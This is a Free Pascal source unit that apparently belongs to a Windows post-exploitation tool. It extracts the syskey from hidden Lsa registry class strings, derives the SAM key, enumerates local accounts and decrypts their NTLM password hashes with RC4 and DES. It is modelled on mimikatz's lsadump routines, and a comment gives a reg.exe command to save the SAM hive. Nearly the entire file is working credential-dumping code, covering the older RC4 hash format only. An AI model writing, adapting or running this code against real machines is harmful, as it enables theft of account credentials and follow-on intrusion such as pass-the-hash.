unit usamutils;

{$mode delphi}

interface

uses
  windows,Classes, SysUtils,utils,uadvapi32;

function getsyskey(var output:tbyte16):boolean;
function getsamkey(syskey:tbyte16;var output:tbyte16):boolean;
function dumphash(samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;
function query_samusers(samkey:tbyte16;func:pointer =nil):boolean;

type tsamuser=record
     samkey:tbyte16;
     rid:dword;
end;
psamuser=^tsamuser;

implementation

function getclass(rootkey:hkey;keyname,valuename:string;var bytes:array of byte):boolean;
var
  ret:long;
  hKeyReg,topKey,hSubKey:thandle;
  dwDisposition:dword=0;
  classSize:dword;
  classStr:array [0..15] of widechar;
  i:byte=0;
begin
result:=false;
ret := RegCreateKeyEx(rootkey,pchar(keyName),0,nil,REG_OPTION_NON_VOLATILE,KEY_QUERY_VALUE,nil,topKey,@dwDisposition);
if ret=error_success then
  begin
  if (RegOpenKeyEx(topKey,pchar(valueName),0,KEY_READ,hSubKey)=ERROR_SUCCESS) then
    begin
    classSize := 8+1;
    fillchar(classStr ,sizeof(classStr ),0);
    ret := RegQueryInfoKeyw(hSubKey,@classStr[0],@classSize,nil,nil,nil,nil,nil,nil,nil,nil,nil);
    if (classSize=8) then
      begin
       while i<8 do
             begin
             bytes[i div 2]:=strtoint('$'+classStr[I]+classStr[i+1]);
             inc(I,2);
             end;
       result:=true;
       end;//if (classSize=8) then
    RegCloseKey(hSubKey);
    end;
  RegCloseKey(topKey);
  end;
end;

{*
 * Get hidden syskey encoded bytes part in class string of a reg key
 * (JD, Skew1, GBG, Data)
 *}
function get_encoded_syskey(var bytes:array of byte):boolean;
const keys:array[0..3] of string=('JD','Skew1','GBG','Data');
var
  i:byte;
  enc_bytes:array[0..3] of byte;
begin
result:=false;
for i:=0 to length(keys)-1 do
    begin
    result:=getclass (HKEY_LOCAL_MACHINE ,'SYSTEM\CurrentControlSet\Control\Lsa',keys[i],enc_bytes);
    CopyMemory (@bytes[i*4],@enc_bytes[0],4);
    end;
end;

//also known as bootkey
function getsyskey(var output:tbyte16):boolean;
const
  syskeyPerm:array[0..15] of byte=($8,$5,$4,$2,$b,$9,$d,$3,$0,$6,$1,$c,$e,$a,$f,$7);
var
  bytes:array[0..15] of byte;
  //syskey:tbyte16;
  i:byte;
  //dummy:string;
begin
result:=false;
//get the encoded syskey
result:=get_encoded_syskey(bytes);
//Get syskey raw bytes (using permutation)
for i:=0 to sizeof(bytes)-1 do output[i] := bytes[syskeyPerm[i]];
//if getsamkey(output,samkey)=true then writeln('SAMKey:'+HashByteToString (samkey));
end;

//see kuhl_m_lsadump_getSamKey in kuhl_m_lsadump_getSamKey
function gethashedbootkeyRC4(salt,syskey:tbyte16;samkey:array of byte;var hashed_bootkey:tbyte16):boolean;
const
  SAM_QWERTY:ansistring='!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%'#0;
  SAM_NUM:ansistring='0123456789012345678901234567890123456789'#0;
  password:pansichar='password';
var
  md5ctx:md5_ctx;
  data:_CRYPTO_BUFFER; //= (SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey),
  key:_CRYPTO_BUFFER; // = (MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest);
  status:ntstatus;
  buffer:array of byte;
begin
//based on the first byte of F
//md5/rc4 on "old" ntlm
        result:=false;

        //test
        {
        MD5Init(md5ctx);
        MD5Update(md5ctx ,password^,strlen(password)); //a buffer, not a pointer - password[0] would work too
        MD5Final(md5ctx );
        writeln('expected:5F4DCC3B5AA765D61D8327DEB882CF99');
        writeln('result  :'+HashByteToString (md5ctx.digest ));
        setlength(buffer,strlen(password));
        copymemory(@buffer[0],password,strlen(password));
        MD5Init(md5ctx);
        MD5Update(md5ctx ,pchar(buffer)^,strlen(password)); //a buffer, not a pointer - buffer[0] would work too
        MD5Final(md5ctx );
        writeln('expected:5F4DCC3B5AA765D61D8327DEB882CF99');
        writeln('result  :'+HashByteToString (md5ctx.digest ));
        }
        //
        fillchar(md5ctx,sizeof(md5ctx ),0);
        MD5Init(md5ctx);
	MD5Update(md5ctx,salt ,SAM_KEY_DATA_SALT_LENGTH); //F[0x70:0x80]=SALT
	MD5Update(md5ctx,pansichar(SAM_QWERTY)^,length(SAM_QWERTY)); //46
	MD5Update(md5ctx,syskey,SYSKEY_LENGTH);  //16
	MD5Update(md5ctx,pansichar(SAM_NUM)^,length(SAM_NUM)); //40
	MD5Final(md5ctx); //rc4_key = MD5(F[0x70:0x80] + aqwerty + bootkey + anum)
        log('RC4Key:'+HashByteToString (md5ctx.digest),0);
        //in and out
        fillchar(data,sizeof(data),0);
        data.Length :=SAM_KEY_DATA_KEY_LENGTH;
        data.MaximumLength :=SAM_KEY_DATA_KEY_LENGTH;
        data.Buffer :=samkey; //F[0x80:0xA0]=SAMKEY encrypted
        //in only
        fillchar(key,sizeof(key),0);
        key.Length:=MD5_DIGEST_LENGTH;
        key.MaximumLength:=MD5_DIGEST_LENGTH;
        key.Buffer:=md5ctx.digest ;  //rc4_key
        status:=RtlEncryptDecryptRC4(data,key);
        if status<>0 then log('RtlEncryptDecryptRC4 NOT OK',0) else log('RtlEncryptDecryptRC4 OK',0);
        result:=status=0;
        if status=0 then CopyMemory(@hashed_bootkey [0],data.Buffer ,sizeof(hashed_bootkey)) ;


end;

//also known as hashed bootkey
function getsamkey(syskey:tbyte16;var output:tbyte16):boolean;
var
  ret:long;
  topkey:thandle;
  cbdata,lptype:dword;
  data:array[0..1023] of byte;
  salt:tbyte16;
  encrypted_samkey:array[0..31] of byte;
  //bytes:array[0..15] of byte;
begin
result:=false;
//only if run as system
//ret := RegCreateKeyEx(HKEY_LOCAL_MACHINE ,pchar('SAM\sam\Domains\account'),0,nil,REG_OPTION_NON_VOLATILE,KEY_READ,nil,topKey,@dwDisposition);
ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SAM\sam\Domains\account',0, KEY_READ, topkey);
if ret=0 then
  begin
  log('RegCreateKeyEx OK',0);
  cbdata:=sizeof(data);
  //contains our salt and encrypted sam key
  ret := RegQueryValueex (topkey,pchar('F'),nil,@lptype,@data[0],@cbdata);
  if ret=0 then
     begin
     {
     //we should cover AES/DES on new "ntlm", based on the first byte of F
     //if F[0]=3 then ...
     hBootIV = HexRegSysk[0x78*2:(0x78+16)*2] ## 16 Bytes iv
     encSysk = HexRegSysk[0x88*2:(0x88+32)*2][:32] ## Only 16 bytes needed
     Syskey = decryptAES(encSysk, hBootkey, hBootIV)
     }
     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
     //writeln(sam[0]);
     CopyMemory(@salt[0],@data[$70],sizeof(salt)) ;
     CopyMemory(@encrypted_samkey[0],@data[$80],sizeof(tbyte16)) ;
     //writeln('SAMKey:'+HashByteToString (samkey));
     result:= gethashedbootkeyRC4(salt,syskey,encrypted_samkey,tbyte16(output)); //=true then writeln('SAMKey:'+HashByteToString (tbyte16(bytes)));
     end
     else log('RegQueryValueex NOT OK:'+inttostr(ret),0);
  end
  else log('RegOpenKeyEx NOT OK:'+inttostr(ret),0);
RegCloseKey(topkey);
end;

function decrypthashRC4(samkey:array of byte;var hash:tbyte16;rid_:dword):boolean;
const
  NTPASSWORD:ansistring = 'NTPASSWORD'#0;
  LMPASSWORD:ansistring = 'LMPASSWORD';
  //bytesrid:array[0..3] of byte =($f4,$01,$00,$00);  //($00,$00,$01,$f4); //500 becomes '000001f4' then reversed
var
  md5ctx:md5_ctx;
  key:_CRYPTO_BUFFER; //{MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
  cypheredHashBuffer:_CRYPTO_BUFFER; //{0, 0, NULL}
  status:ntstatus;
  i:byte;
  data:array[0..15] of byte;
begin
result:=false;
//STEP4, use SAM-/Syskey to RC4/AES decrypt the Hash
fillchar(md5ctx,sizeof(md5ctx ),0);
MD5Init(md5ctx);
MD5Update(md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
MD5Update(md5ctx, rid_, sizeof(DWORD));
MD5Update(md5ctx, pansichar(NTPASSWORD)^,length(NTPASSWORD));
MD5Final(md5ctx);
log('RC4Key:'+HashByteToString (md5ctx.digest ));
//
//in and out
fillchar(cypheredHashBuffer,sizeof(cypheredHashBuffer),0);
cypheredHashBuffer.Length :=16;
cypheredHashBuffer.MaximumLength := 16 ; //pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
cypheredHashBuffer.Buffer := hash;
// in
key.Length  :=MD5_DIGEST_LENGTH;
key.MaximumLength :=MD5_DIGEST_LENGTH;
key.Buffer :=md5ctx.digest;
status := RtlEncryptDecryptRC4(cypheredHashBuffer, key );
if status<>0 then log('RtlEncryptDecryptRC4 NOT OK',0) else log('RtlEncryptDecryptRC4 OK',0);
//STEP5, use DES derived from RID to fully decrypt the Hash
//...
//kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
for i := 0 to cypheredHashBuffer.Length -1 do
  begin
  //i := i+ 16; //LM_NTLM_HASH_LENGTH; //?
  status:=RtlDecryptDES2blocks1DWORD(cypheredHashBuffer.Buffer  + i, @rid_, data);
  if status=0 then
              begin
              //writeln('ok:'+HashByteToString (data)); //debug
              copymemory(@hash[0],@data[0],16);
              result:=status=0;
              break;
              end
              else writeln('not ok')
  end;
end;

//reg.exe save hklm\sam c:\temp\sam.save
//see https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
function dumphash(samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;
var
  ret:long;
  topkey:thandle;
  cbdata,lptype:dword;
  data:array[0..1023] of byte;
  //hash:tbyte16;
  offset,name_offset,name_length:dword;
  name:pwidechar;
begin
result:=false;
//only if run as system
//ret := RegCreateKeyEx(HKEY_LOCAL_MACHINE ,pchar('SAM\sam\Domains\account'),0,nil,REG_OPTION_NON_VOLATILE,KEY_READ,nil,topKey,@dwDisposition);
ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users\'+inttohex(rid,8)),0, KEY_READ, topkey);
if ret=0 then
  begin
  log('RegCreateKeyEx OK',0);
  cbdata:=sizeof(data);
  //contains our salt and encrypted sam key
  ret := RegQueryValueex (topkey,pchar('V'),nil,@lptype,@data[0],@cbdata);
  if ret=0 then
     begin
     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
     //we should check the length 0x14=rc4 / 0x38=aes
     //see https://github.com/tijldeneut/Security/blob/master/DumpSomeHashes/DumpSomeHashesAuto.py
     {
     if hex(Length)=='0x38': ## AES Encrypted Hash
     EncryptedHash = decryptAES(Hash, Syskey, IV)
     }
     //username
     copymemory(@name_offset,@data[$0C],sizeof(name_offset));
     name_offset := name_offset + $CC;
     copymemory(@name_length,@data[$10],sizeof(name_length));
     copymemory(@offset,@data[$A8],sizeof(offset));
     name:=allocmem(name_length);
     CopyMemory(name,@data[name_offset],name_length );
     username:=name;
     //
     offset:=offset+$CC+4; //the first 4 bytes are a header (revision, etc?)
     log('Offset:'+inttohex(offset,4),0);
     CopyMemory(@output[0],@data[offset],sizeof(output)) ;
     log('Encrypted Hash:'+HashByteToString (output),0);
     result:=decrypthashRC4(samkey ,output,rid);
     end
     else writeln(ret);
  end;
RegCloseKey(topkey);
end;

function query_samusers(samkey:tbyte16;func:pointer =nil):boolean;
const
  MAX_KEY_LENGTH =255;
  MAX_VALUE_NAME =16383;
var i:byte;
  retcode,cbname:dword;
  achKey:array[0..MAX_KEY_LENGTH-1] of char;
  ftLastWriteTime:filetime;
  hKey:thandle;
  param:tsamuser;
begin
retcode:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users'),0, KEY_READ, hKey);
if retcode<>0 then begin log('RegOpenKeyEx NOT OK',0);exit;end;
for i:=0 to 254 do
  begin
            cbName := MAX_KEY_LENGTH;
            retCode := RegEnumKeyEx(hKey, i,
                     @achKey[0],
                     cbName,
                     nil,
                     nil,
                     nil,
                     @ftLastWriteTime);
            if (retCode <>ERROR_SUCCESS) then break;
            if (lowercase(strpas(achKey)))='names' then break;
            if func=nil then log( strpas(achKey)+' '+inttostr(strtoint('$'+strpas(achKey))),1);
            if func<>nil then
               begin
               param.samkey :=samkey;
               param.rid :=strtoint('$'+strpas(achKey));
               fn(func)(@param );

               end;
end;

end;

end.

